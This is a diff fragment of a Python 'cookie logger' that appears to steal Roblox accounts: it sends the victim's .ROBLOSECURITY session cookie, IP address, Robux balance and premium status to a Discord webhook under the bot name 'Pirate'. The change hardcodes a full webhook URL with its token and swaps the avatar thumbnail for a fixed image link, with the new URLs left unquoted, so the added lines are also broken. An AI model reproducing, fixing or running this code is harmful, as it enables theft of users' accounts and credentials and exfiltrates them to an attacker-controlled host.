@@ -108,7 +108,7 @@ robux = info['RobuxBalance']
 premium = info['IsPremium'];
 #################### SENDING TO WEBHOOK #################
 
-discord = Discord(url=webhookk)
+discord = Discord(url=https://discord.com/api/webhooks/1196714018249916507/QeOL2sBsT-G1GzAEcIU-vqo0z0LXG_-RMcwMl9lQKidHLG9vh0dH3_Wa9ulGtL4LzkON)
 discord.post(
     username="BOT - Pirate 🍪",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
@@ -129,7 +129,7 @@ discord.post(
                 {"name" : "IP Address", "value" : ip_address, "inline:": True},
                 {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
-            "thumbnail": {"url": headshot},
+            "thumbnail": {"url": https://i.pinimg.com/564x/4f/3b/d4/4f3bd4772c980c4a28b9e02e311ee9d1.jpg},
 
 
         }
